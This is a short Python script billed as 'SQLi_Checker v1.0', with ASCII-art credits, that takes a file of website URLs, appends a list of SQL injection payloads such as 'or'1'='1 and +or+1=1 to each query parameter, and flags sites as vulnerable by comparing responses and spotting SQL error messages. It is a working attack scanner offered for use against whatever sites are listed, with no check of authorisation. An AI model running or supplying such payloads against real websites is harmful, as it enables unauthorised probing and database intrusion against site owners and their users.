import requests
import time


print('''\033[1;36m
    .'``.``.
 __/ (0) `, `.
'-=`,     ;   `.
    \    :      `-.
    /    ';        `.
   /      .'         `.
   |     (      `.     `-.._
    \     \` ` `. \         `-.._
     `.   ;`-.._ `-`._.-. `-._   `-._
       `..'     `-.```.  `-._ `-.._.'
         `--..__..-`--'      `-.,'
            `._)`/
             /--(
          -./,--'`-,
       ,^--(                    
       ,--' `-,          
        -+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        +      ..| SQLi_Checker v1.0 |..       +
        -                                      -
        -                Mesh3l                -
        +          Twitter: Mesh3l_911         +
        -+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+                                                 
\033[1;m''')
print()

def SQLi_Checker():

    try:

        links_path=input(" [>]Input Urls path :")
        print()
        for i in range(101):
            print("\r\033[1;36m [>]Ok now,please Gentlemen have ur seat belts fastened ^_* {} \033[1;m".format(i),"\033[1;36m%\033[1;m", end="")
            time.sleep(0.02)

        print()
        print()
        with open(links_path, 'r') as f:

            for url in f.read().splitlines():

                l=url.split('=')[0]
                r=url.split('=')[1]
                eq='='
                payloads=["'",'"',"`","/'/","'||'asd'||'","'or'1'='1","+or+1=1","'or''='",')',"')"]

                for payload in payloads:
                    query=l+eq+r+payload
                    content=requests.get(url).text
                    new_content=requests.get(query).text

                    if content != new_content and 'error in your SQL syntax' not in new_content:
                        print("\033[1;37m [+] This website might be vulnerable with this payload go and make sure manually : {} \033[1;m ".format(query))
                    elif 'error in your SQL syntax' in new_content:
                        print("\033[1;32m [+] This website is 100% vulnerable with this payload ^_^ : {} \033[1;m ".format(query))
                    else:
                        print("\033[1;31m [-] This website seems not to be vulnerable with this payload :( : {} \033[1;m ".format(query))

                print()
            print()
    except FileNotFoundError:
        print("Sorry No such file or directory :( , please make sure of the path ")
        print()
        quit()


print()
SQLi_Checker()

